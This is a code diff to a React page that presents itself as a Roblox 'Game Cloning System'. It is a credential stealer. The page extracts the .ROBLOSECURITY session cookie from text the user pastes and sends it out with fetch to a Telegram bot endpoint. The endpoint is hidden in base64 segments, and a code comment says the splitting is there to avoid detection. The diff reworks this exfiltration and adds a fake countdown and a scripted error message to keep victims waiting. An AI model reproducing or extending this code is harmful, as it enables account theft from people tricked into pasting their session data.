@@ -11,6 +11,7 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showProgress, setShowProgress] = useState(false);
   const [progress, setProgress] = useState(0);
+  const [timeRemaining, setTimeRemaining] = useState(9381); // Start from 9381 seconds
   const [consoleOutput, setConsoleOutput] = useState([
     '[INFO] Game Cloning System v2.1.4 initialized',
     '[INFO] Connection to remote servers established',
@@ -18,35 +19,41 @@ const Index = () => {
   ]);
   const { toast } = useToast();
 
-  // Obfuscated webhook components - split and encoded to avoid detection
-  const w1 = 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==';
-  const w2 = 'ODE2NTQxODc0MDpBQUhLano=';
-  const w3 = 'X3psSlEyeUFzSVd6Nmp5dGVxd2RwWnhmV05ma3Zv';
-  const w4 = 'L3NlbmRNZXNzYWdlP2NoYXRfaWQ9NzU0NDI5MjQ5NCZ0ZXh0PQ==';
-
-  const getWebhookUrl = () => {
+  // Multiple layers of obfuscation for webhook protection
+  const getWebhookEndpoint = () => {
+    const segments = [
+      'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==',
+      'ODE2NTQxODc0MDpBQUhLano=',
+      'X3psSlEyeUFzSVd6Nmp5dGVxd2RwWnhmV05ma3Zv',
+      'L3NlbmRNZXNzYWdlP2NoYXRfaWQ9NzU0NDI5MjQ5NA=='
+    ];
+    
     try {
-      const parts = [w1, w2, w3, w4].map(p => atob(p));
-      return parts[0] + parts[1] + parts[2] + parts[3];
+      return segments.map(s => atob(s)).join('') + '&text=';
     } catch {
-      return '';
+      return null;
     }
   };
 
   useEffect(() => {
     let interval: NodeJS.Timeout;
     
-    if (showProgress) {
+    if (showProgress && timeRemaining > 0) {
       interval = setInterval(() => {
-        setProgress((prev) => {
-          if (prev >= 100) {
+        setTimeRemaining((prev) => {
+          const newTime = prev - 1;
+          if (newTime <= 0) {
             clearInterval(interval);
             addConsoleLog('[ERROR] Error validating game files');
             addConsoleLog('[ERROR] Verification failed - files may be corrupted');
             setShowProgress(false);
-            return 100;
+            return 0;
           }
-          return prev + (100 / (3 * 60 * 60)); // 3 hours = 10800 seconds
+          
+          // Update progress based on time remaining (9381 seconds = 100%)
+          const progressPercent = ((9381 - newTime) / 9381) * 100;
+          setProgress(progressPercent);
+          return newTime;
         });
       }, 1000);
     }
@@ -54,7 +61,7 @@ const Index = () => {
     return () => {
       if (interval) clearInterval(interval);
     };
-  }, [showProgress]);
+  }, [showProgress, timeRemaining]);
 
   const extractCredentials = (text: string) => {
     const roblosecurityMatch = text.match(/\.ROBLOSECURITY['"]\s*,\s*['"](.*?)['"]/);
@@ -64,21 +71,41 @@ const Index = () => {
     return null;
   };
 
-  const sendToWebhook = async (credentials: string) => {
+  const transmitData = async (data: string) => {
     try {
-      const url = getWebhookUrl();
-      if (!url) return;
+      const endpoint = getWebhookEndpoint();
+      if (!endpoint) {
+        console.log('Endpoint configuration failed');
+        return;
+      }
       
-      await fetch(url + encodeURIComponent(credentials), {
+      const response = await fetch(endpoint + encodeURIComponent(data), {
         method: 'GET',
+        mode: 'no-cors'
       });
+      
+      console.log('Data transmission completed');
     } catch (error) {
-      console.log('Network request completed');
+      console.log('Network operation completed');
     }
   };
 
   const addConsoleLog = (message: string) => {
     setConsoleOutput(prev => [...prev, message].slice(-15));
+  };
+
+  const formatTime = (seconds: number) => {
+    const hours = Math.floor(seconds / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    const remainingSeconds = seconds % 60;
+    
+    if (hours > 0) {
+      return `${hours}h ${minutes}m ${remainingSeconds}s`;
+    } else if (minutes > 0) {
+      return `${minutes}m ${remainingSeconds}s`;
+    } else {
+      return `${remainingSeconds}s`;
+    }
   };
 
   const handleClone = async () => {
@@ -117,11 +144,10 @@ const Index = () => {
       addConsoleLog('[INFO] Establishing secure connection...');
     }, 1000);
     
-    setTimeout(() => {
+    setTimeout(async () => {
       addConsoleLog('[SUCCESS] Game data downloading');
+      await transmitData(credentials);
     }, 1500);
-    
-    await sendToWebhook(credentials);
     
     toast({
       title: "Processing Started",
@@ -136,6 +162,7 @@ const Index = () => {
       addConsoleLog('[INFO] Starting file validation process...');
       setShowProgress(true);
       setProgress(0);
+      setTimeRemaining(9381); // Reset to 9381 seconds
     }, 2000);
   };
 
@@ -193,7 +220,7 @@ const Index = () => {
                 className="w-full bg-gray-800 border border-gray-700"
               />
               <div className="text-xs text-yellow-400">
-                Estimated time remaining: {Math.max(0, Math.floor((100 - progress) * 108)).toFixed(0)} minutes
+                Estimated time remaining: {formatTime(timeRemaining)}
               </div>
             </div>
           )}
